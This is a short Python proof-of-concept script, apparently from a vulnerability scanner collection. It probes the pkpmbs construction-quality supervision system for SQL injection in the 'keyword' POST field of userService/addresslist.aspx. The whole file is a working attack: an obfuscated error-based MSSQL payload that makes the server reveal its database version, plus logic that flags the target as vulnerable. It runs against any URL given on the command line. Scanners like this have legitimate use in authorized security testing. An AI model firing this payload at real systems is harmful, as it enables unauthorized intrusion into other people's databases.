#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: pkpmbs建设工程质量监督系统注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0120366
author: Lucifer
description: userService/addresslist.aspx文件中POST keyword存在SQL注入。
'''
import sys
import json
import requests
import warnings
sys.path.append('../../')
from color import *

class pkpmbs_addresslist_keyword_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/userService/addresslist.aspx"
        post_data = {
            "keyword":"1'AnD 1=CoNvErt(InT,(ChAr(71)+ChAr(65)+ChAr(79)+ChAr(74)+ChAr(73)+@@VeRsIon)) AnD'%'='",
            "Submit3":"%E6%90%9C%E3%80%80%E7%B4%A2"
        }
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"GAOJIMicrosoft" in req.text:
                printGreen("[+]Success:存在pkpmbs建设工程质量监督系统注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
            else:
                printBlue("[-]Info:不存在pkpmbs_addresslist_keyword_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = pkpmbs_addresslist_keyword_sqli(sys.argv[1])
    testVuln.run()